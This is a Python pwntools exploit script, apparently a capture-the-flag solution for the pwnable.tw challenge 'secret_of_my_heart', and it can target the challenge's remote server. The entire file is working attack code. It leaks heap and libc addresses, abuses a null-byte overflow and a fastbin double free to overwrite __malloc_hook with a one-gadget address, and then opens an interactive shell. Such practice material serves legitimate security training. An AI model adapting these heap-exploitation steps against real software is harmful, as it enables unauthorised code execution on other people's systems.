from pwn import *

e = ELF("./secret_of_my_heart")
libc = ELF("./libc_64.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10302)
else:
  p = process(e.path)

nums = []
def alloc(size=0xf8, payload="AAAA", name="A"):
  global nums

  p.sendline("1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", name + ("" if len(name) == 0x20 else "\n"))
  p.sendafter(":", payload)
  p.recvuntil(":")

  for i in range(100):
    if i not in nums:
      nums.append(i)
      return i

def free(idx):
  p.sendline("3")
  p.sendlineafter(":", str(idx))
  p.recvuntil(":")

  nums.remove(idx)

p.recvuntil(":")

A = alloc(name="A" * 0x20)

p.sendline("2")
p.sendlineafter(":", "0")
p.recvuntil("A" * 0x20)

heap_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x10
print("{:#x}".format(heap_base))
p.recvuntil("choice :")

free(A)

B = alloc(0xf8)
C = alloc(0xf8)
alloc(0xf8)

free(B)
alloc(0xf8, p64(heap_base) * 2 + "A" * (0xf0 - 0x10) + p64(0x100))

free(C)

p.sendline("2")
p.sendlineafter(":", str(B))
p.recvuntil("Secret : ")
libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["__malloc_hook"] - 88 - 0x10 
print("{:#x}".format(libc_base))
p.recvuntil("choice :")

A = alloc(0x68)
C = alloc(0x68)

free(A)
free(C)
free(B) # B = A

A = alloc(0x68, p64(libc_base + libc.symbols["__malloc_hook"] - 0x23))
alloc(0x68)
B = alloc(0x68)

alloc(0x68, "\x00" * 0x13 + p64(libc_base + 0xef6c4))

free(A)

p.sendline("3")
p.sendlineafter(":", str(B))

p.interactive()
